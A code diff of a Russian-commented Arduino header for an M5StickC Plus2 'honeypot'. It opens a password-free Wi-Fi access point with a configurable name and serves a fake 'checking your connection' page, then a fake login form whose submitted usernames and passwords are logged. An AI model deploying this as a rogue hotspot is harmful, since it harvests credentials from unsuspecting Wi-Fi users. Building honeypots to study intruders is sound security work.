@@ -1,16 +1,13 @@
 #ifndef HONEYPOT_H
 #define HONEYPOT_H
 
-#include <Arduino.h>
-#include <WiFi.h>
 #include <ESPAsyncWebServer.h>
-#include <AsyncTCP.h>
-#include <ArduinoJson.h>
+#include <IPAddress.h>
 #include <vector>
-#include <LittleFS.h>
+#include <M5StickCPlus2.h>
 
-// Максимальное количество записей в логе
-#define MAX_HONEYPOT_LOGS 10
+// Максимальное количество соединений для логирования
+#define MAX_HONEYPOT_CONNECTIONS 10
 
 // Структура для хранения информации о соединении
 struct HoneypotConnection {
@@ -20,264 +17,198 @@ struct HoneypotConnection {
   unsigned long timestamp;
 };
 
-// Класс для режима Honeypot
+// Класс Honeypot для управления режимом ловушки
 class Honeypot {
 private:
-  std::vector<HoneypotConnection> connections;
-  AsyncWebServer* server;
-  bool active;
+  // Буфер соединений
+  HoneypotConnection connections[MAX_HONEYPOT_CONNECTIONS];
+  int connectionCount;
   
-  // Callback для журналирования соединений
-  static void logConnection(AsyncWebServerRequest *request, Honeypot* honeypot);
+  // Точка доступа
+  String ssid;
+  int channel;
   
-  // Обработчик клиентских соединений
-  void handleClientConnection(AsyncClient* client);
+  // Сетевые настройки
+  IPAddress localIP;
+  IPAddress gateway;
+  IPAddress subnet;
+  
+  // Колбэк для обработки соединений
+  std::function<void(HoneypotConnection&)> onConnectionCallback;
 
 public:
-  Honeypot(AsyncWebServer* server);
-  
-  // Запуск/остановка режима Honeypot
-  bool start(const String& ssid, int channel = 1);
-  void stop();
-  
-  // Получение журнала соединений
-  const std::vector<HoneypotConnection>& getConnections() const;
-  
-  // Очистка журнала
-  void clearLogs();
-  
-  // Сохранение/загрузка логов
-  void saveLogs(fs::FS &fs);
-  void loadLogs(fs::FS &fs);
-  
-  // Настройка API
-  void setupAPI();
-  
-  // Проверка активности
-  bool isActive() const;
-};
-
-// Реализация класса Honeypot
-
-Honeypot::Honeypot(AsyncWebServer* server) : server(server), active(false) {
-  // Ограничиваем размер вектора для экономии памяти
-  connections.reserve(MAX_HONEYPOT_LOGS);
-}
-
-bool Honeypot::start(const String& ssid, int channel) {
-  if (active) {
-    return false; // Уже запущен
+  // Конструктор
+  Honeypot() : connectionCount(0), ssid("HoneyPot"), channel(1) {
+    localIP.fromString("192.168.4.1");
+    gateway.fromString("192.168.4.1");
+    subnet.fromString("255.255.255.0");
   }
   
-  // Запускаем режим точки доступа без пароля
-  if (!WiFi.softAP(ssid.c_str(), "", channel)) {
-    return false;
-  }
-  
-  active = true;
-  
-  // Настраиваем маршруты для обработки всех запросов
-  server->onNotFound([this](AsyncWebServerRequest *request) {
-    logConnection(request, this);
+  // Начать работу Honeypot
+  void begin(AsyncWebServer& server) {
+    // Включаем точку доступа
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP(ssid.c_str(), "", channel); // Открытая точка доступа без пароля
+    WiFi.softAPConfig(localIP, gateway, subnet);
     
-    // Отправляем поддельный ответ, как будто это обычный веб-сервер
-    request->send(200, "text/html", "<html><body><h1>Welcome</h1><p>This is a test page.</p></body></html>");
-  });
-  
-  return true;
-}
-
-void Honeypot::stop() {
-  if (!active) {
-    return;
-  }
-  
-  // Останавливаем точку доступа
-  WiFi.softAPdisconnect(true);
-  active = false;
-  
-  // Удаляем обработчик для всех запросов
-  server->onNotFound([](AsyncWebServerRequest *request) {
-    request->send(404);
-  });
-}
-
-const std::vector<HoneypotConnection>& Honeypot::getConnections() const {
-  return connections;
-}
-
-void Honeypot::clearLogs() {
-  connections.clear();
-}
-
-void Honeypot::logConnection(AsyncWebServerRequest *request, Honeypot* honeypot) {
-  if (!honeypot->active) {
-    return;
-  }
-  
-  HoneypotConnection connection;
-  connection.clientIP = request->client()->remoteIP();
-  connection.port = request->client()->remotePort();
-  connection.timestamp = millis();
-  
-  // Собираем данные о запросе
-  String requestData = request->methodToString();
-  requestData += " ";
-  requestData += request->url();
-  requestData += " HTTP/1.1\n";
-  
-  // Добавляем заголовки (ограничиваем количество для экономии памяти)
-  int headerCount = 0;
-  for (int i = 0; i < request->headers(); i++) {
-    if (headerCount < 5) { // Максимум 5 заголовков
-      AsyncWebHeader* h = request->getHeader(i);
-      requestData += h->name();
-      requestData += ": ";
-      requestData += h->value();
-      requestData += "\n";
-      headerCount++;
-    }
-  }
-  
-  connection.requestData = requestData;
-  
-  // Если достигнут лимит, удаляем самую старую запись
-  if (honeypot->connections.size() >= MAX_HONEYPOT_LOGS) {
-    honeypot->connections.erase(honeypot->connections.begin());
-  }
-  
-  // Добавляем новую запись
-  honeypot->connections.push_back(connection);
-}
-
-void Honeypot::saveLogs(fs::FS &fs) {
-  DynamicJsonDocument doc(4096);
-  JsonArray logsArray = doc.createNestedArray("logs");
-  
-  for (const auto& connection : connections) {
-    JsonObject logObj = logsArray.createNestedObject();
-    logObj["ip"] = connection.clientIP.toString();
-    logObj["port"] = connection.port;
-    logObj["timestamp"] = connection.timestamp;
-    logObj["data"] = connection.requestData;
-  }
-  
-  File configFile = fs.open("/honeypot_logs.json", "w");
-  if (!configFile) {
-    return;
-  }
-  
-  serializeJson(doc, configFile);
-  configFile.close();
-}
-
-void Honeypot::loadLogs(fs::FS &fs) {
-  if (!fs.exists("/honeypot_logs.json")) {
-    return;
-  }
-  
-  File configFile = fs.open("/honeypot_logs.json", "r");
-  if (!configFile) {
-    return;
-  }
-  
-  DynamicJsonDocument doc(4096);
-  DeserializationError error = deserializeJson(doc, configFile);
-  configFile.close();
-  
-  if (error) {
-    return;
-  }
-  
-  connections.clear();
-  
-  if (doc.containsKey("logs")) {
-    JsonArray logsArray = doc["logs"];
+    // Сбрасываем счетчик соединений
+    connectionCount = 0;
     
-    for (JsonObject logObj : logsArray) {
-      HoneypotConnection connection;
+    // Настраиваем запись всех соединений
+    server.onNotFound([this](AsyncWebServerRequest *request){
+      // Логируем соединение
+      logConnection(request, this);
       
-      if (connection.clientIP.fromString(logObj["ip"].as<String>())) {
-        connection.port = logObj["port"].as<uint16_t>();
-        connection.timestamp = logObj["timestamp"].as<unsigned long>();
-        connection.requestData = logObj["data"].as<String>();
-        
-        if (connections.size() < MAX_HONEYPOT_LOGS) {
-          connections.push_back(connection);
-        }
-      }
+      // Отправляем ответ
+      request->send(200, "text/plain", "OK");
+    });
+    
+    // Добавляем обработчик для всех типов запросов на корневой URL
+    server.on("/", HTTP_ANY, [this](AsyncWebServerRequest *request){
+      // Логируем соединение
+      logConnection(request, this);
+      
+      // Отправляем страницу-приманку
+      request->send(200, "text/html", 
+        "<html><body><h1>Welcome to WiFi Network</h1>"
+        "<p>Please wait while we check your connection...</p>"
+        "<script>setTimeout(function() { "
+        "window.location.href = '/dashboard'; }, 3000);</script>"
+        "</body></html>");
+    });
+    
+    // Страница "панели управления"
+    server.on("/dashboard", HTTP_ANY, [this](AsyncWebServerRequest *request){
+      // Логируем соединение
+      logConnection(request, this);
+      
+      // Отправляем форму входа
+      request->send(200, "text/html", 
+        "<html><body><h1>Login Required</h1>"
+        "<form action='/login' method='post'>"
+        "Username: <input type='text' name='username'><br>"
+        "Password: <input type='password' name='password'><br>"
+        "<input type='submit' value='Login'>"
+        "</form></body></html>");
+    });
+    
+    // Страница логина
+    server.on("/login", HTTP_ANY, [this](AsyncWebServerRequest *request){
+      // Логируем соединение с расширенной проверкой наличия учетных данных
+      logConnection(request, this);
+      
+      // Сообщаем об ошибке входа
+      request->send(403, "text/html", 
+        "<html><body><h1>Authentication Failed</h1>"
+        "<p>Invalid username or password.</p>"
+        "<a href='/dashboard'>Try again</a>"
+        "</body></html>");
+    });
+    
+    M5.Lcd.println("Honeypot started on " + WiFi.softAPIP().toString());
+  }
+  
+  // Установить SSID точки доступа
+  void setSSID(const String& newSSID) {
+    ssid = newSSID;
+  }
+  
+  // Получить SSID точки доступа
+  String getSSID() const {
+    return ssid;
+  }
+  
+  // Установить канал точки доступа
+  void setChannel(int newChannel) {
+    if (newChannel >= 1 && newChannel <= 13) {
+      channel = newChannel;
     }
   }
-}
-
-void Honeypot::setupAPI() {
-  // API для получения журнала соединений
-  server->on("/api/honeypot/logs", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    DynamicJsonDocument doc(4096);
-    JsonArray logsArray = doc.createNestedArray("logs");
-    
-    for (const auto& connection : connections) {
-      JsonObject logObj = logsArray.createNestedObject();
-      logObj["ip"] = connection.clientIP.toString();
-      logObj["port"] = connection.port;
-      logObj["timestamp"] = connection.timestamp;
-      logObj["data"] = connection.requestData;
-    }
-    
-    String response;
-    serializeJson(doc, response);
-    request->send(200, "application/json", response);
-  });
   
-  // API для очистки журнала
-  server->on("/api/honeypot/clear", HTTP_POST, [this](AsyncWebServerRequest *request) {
-    clearLogs();
-    request->send(200, "application/json", "{\"success\":true}");
-  });
+  // Получить все логи соединений
+  const HoneypotConnection* getConnections() const {
+    return connections;
+  }
   
-  // API для запуска/остановки Honeypot
-  server->on("/api/honeypot/toggle", HTTP_POST, [this](AsyncWebServerRequest *request) {
-    bool wantActive = true;
-    String ssid = "HoneypotAP";
-    int channel = 1;
-    
-    if (request->hasParam("active", true)) {
-      wantActive = (request->getParam("active", true)->value() == "true" || 
-                    request->getParam("active", true)->value() == "1");
+  // Получить количество логов
+  int getConnectionCount() const {
+    return connectionCount;
+  }
+  
+  // Очистить логи
+  void clearConnections() {
+    connectionCount = 0;
+  }
+  
+  // Установить колбэк для обработки новых соединений
+  void setOnConnectionCallback(std::function<void(HoneypotConnection&)> callback) {
+    onConnectionCallback = callback;
+  }
+  
+  // Статический метод для логирования соединений
+  static void logConnection(AsyncWebServerRequest* request, Honeypot* honeypot) {
+    // Проверяем, не переполнен ли буфер
+    if (honeypot->connectionCount >= MAX_HONEYPOT_CONNECTIONS) {
+      // Если буфер заполнен, смещаем все записи на одну позицию назад
+      for (int i = 0; i < MAX_HONEYPOT_CONNECTIONS - 1; i++) {
+        honeypot->connections[i] = honeypot->connections[i + 1];
+      }
+      honeypot->connectionCount = MAX_HONEYPOT_CONNECTIONS - 1;
     }
     
-    if (request->hasParam("ssid", true)) {
-      ssid = request->getParam("ssid", true)->value();
+    // Получаем индекс для новой записи
+    int index = honeypot->connectionCount;
+    
+    // Заполняем информацию о соединении
+    honeypot->connections[index].clientIP = request->client()->remoteIP();
+    honeypot->connections[index].port = request->client()->remotePort();
+    honeypot->connections[index].timestamp = millis();
+    
+    // Собираем информацию о запросе
+    String requestData = request->url();
+    // Исправление строки для устранения ошибки конкатенации
+    String methodStr = " [";
+    methodStr += request->methodToString();
+    methodStr += "]";
+    requestData += methodStr;
+    
+    // Добавляем информацию о заголовках
+    for (int i = 0; i < request->headers(); i++) {
+      // Используем const AsyncWebHeader* вместо AsyncWebHeader*
+      const AsyncWebHeader* h = request->getHeader(i);
+      requestData += " " + h->name() + ":" + h->value();
     }
     
-    if (request->hasParam("channel", true)) {
-      channel = request->getParam("channel", true)->value().toInt();
-      if (channel < 1 || channel > 13) channel = 1;
+    // Добавляем информацию о параметрах
+    for (int i = 0; i < request->params(); i++) {
+      // Используем const AsyncWebParameter* вместо AsyncWebParameter*
+      const AsyncWebParameter* p = request->getParam(i);
+      requestData += " " + p->name() + "=" + p->value();
     }
     
-    bool success = false;
+    // Сохраняем данные запроса
+    honeypot->connections[index].requestData = requestData;
     
-    if (wantActive && !active) {
-      success = start(ssid, channel);
-    } else if (!wantActive && active) {
-      stop();
-      success = true;
-    } else {
-      success = true; // Уже в нужном состоянии
+    // Увеличиваем счетчик соединений
+    honeypot->connectionCount++;
+    
+    // Вызываем колбэк, если он установлен
+    if (honeypot->onConnectionCallback) {
+      honeypot->onConnectionCallback(honeypot->connections[index]);
     }
     
-    DynamicJsonDocument doc(256);
-    doc["success"] = success;
-    doc["active"] = active;
-    
-    String response;
-    serializeJson(doc, response);
-    request->send(200, "application/json", response);
-  });
-}
-
-bool Honeypot::isActive() const {
-  return active;
-}
+    // Выводим информацию на экран
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setCursor(0, 0);
+    M5.Lcd.println("Honeypot Activity");
+    M5.Lcd.println("-----------------");
+    M5.Lcd.print("Client: ");
+    M5.Lcd.println(honeypot->connections[index].clientIP.toString());
+    M5.Lcd.print("URL: ");
+    M5.Lcd.println(request->url());
+    M5.Lcd.print("Total connections: ");
+    M5.Lcd.println(honeypot->connectionCount);
+  }
+};
 
 #endif // HONEYPOT_H
